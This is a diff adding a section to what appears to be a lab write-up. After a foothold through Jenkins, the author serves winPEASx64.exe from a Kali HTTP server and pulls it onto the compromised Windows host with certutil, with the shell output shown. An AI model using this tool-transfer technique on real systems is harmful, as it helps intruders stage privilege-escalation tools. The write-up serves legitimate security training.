@@ -235,3 +235,92 @@ Use the winpeasx64
 
 - winPEASx64.exe 
 
+Make your kali as python http server
+
+```
+┌──(root㉿kali)-[~]
+└─# mv Downloads/winPEASx64.exe /transfer/
+
+┌──(root㉿kali)-[~]
+└─# cd /transfer 
+
+┌──(root㉿kali)-[/transfer]
+└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.64.7 - - [08/Jul/2024 16:59:58] "GET /winPEASx64.exe HTTP/1.1" 200 -
+192.168.64.7 - - [08/Jul/2024 16:59:59] "GET /winPEASx64.exe HTTP/1.1" 200 -
+
+```
+
+
+Download the winPEASx64.exe from your kali to the windows.
+
+1. Make sure you are in the directorry where you can access the file. You can go to `c:\users\butler`. 
+3. Use the command `certutil.exe -urlcache -f http://192.168.64.4/winPEASx64.exe winpeas.exe` to download thw winPEASx64.exe as winpeas.exe
+
+```
+C:\Program Files\Jenkins>cd c:\users
+cd c:\users
+
+c:\Users>cd butler
+cd butler
+
+c:\Users\butler>dir 
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 1067-CB24
+
+ Directory of c:\Users\butler
+
+07/08/2024  02:28 PM    <DIR>          .
+07/08/2024  02:28 PM    <DIR>          ..
+08/14/2021  05:16 AM    <DIR>          .groovy
+08/14/2021  04:54 AM    <DIR>          3D Objects
+08/14/2021  04:54 AM    <DIR>          Contacts
+08/14/2021  04:54 AM    <DIR>          Desktop
+08/14/2021  04:54 AM    <DIR>          Documents
+08/14/2021  05:23 AM    <DIR>          Downloads
+08/14/2021  04:54 AM    <DIR>          Favorites
+08/14/2021  04:54 AM    <DIR>          Links
+08/14/2021  04:54 AM    <DIR>          Music
+08/14/2021  04:56 AM    <DIR>          OneDrive
+08/14/2021  04:55 AM    <DIR>          Pictures
+08/14/2021  04:54 AM    <DIR>          Saved Games
+08/14/2021  04:55 AM    <DIR>          Searches
+08/14/2021  04:54 AM    <DIR>          Videos
+               0 File(s)              0 bytes
+              16 Dir(s)  12,394,033,152 bytes free
+
+c:\Users\butler>certutil.exe -urlcache -f http://192.168.64.4/winPEASx64.exe winpeas.exe
+certutil.exe -urlcache -f http://192.168.64.4/winPEASx64.exe winpeas.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+c:\Users\butler>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 1067-CB24
+
+ Directory of c:\Users\butler
+
+07/08/2024  07:59 PM    <DIR>          .
+07/08/2024  07:59 PM    <DIR>          ..
+08/14/2021  05:16 AM    <DIR>          .groovy
+08/14/2021  04:54 AM    <DIR>          3D Objects
+08/14/2021  04:54 AM    <DIR>          Contacts
+08/14/2021  04:54 AM    <DIR>          Desktop
+08/14/2021  04:54 AM    <DIR>          Documents
+08/14/2021  05:23 AM    <DIR>          Downloads
+08/14/2021  04:54 AM    <DIR>          Favorites
+08/14/2021  04:54 AM    <DIR>          Links
+08/14/2021  04:54 AM    <DIR>          Music
+08/14/2021  04:56 AM    <DIR>          OneDrive
+08/14/2021  04:55 AM    <DIR>          Pictures
+08/14/2021  04:54 AM    <DIR>          Saved Games
+08/14/2021  04:55 AM    <DIR>          Searches
+08/14/2021  04:54 AM    <DIR>          Videos
+07/08/2024  07:59 PM         2,387,456 winpeas.exe
+               1 File(s)      2,387,456 bytes
+              16 Dir(s)  12,389,249,024 bytes free
+
+```
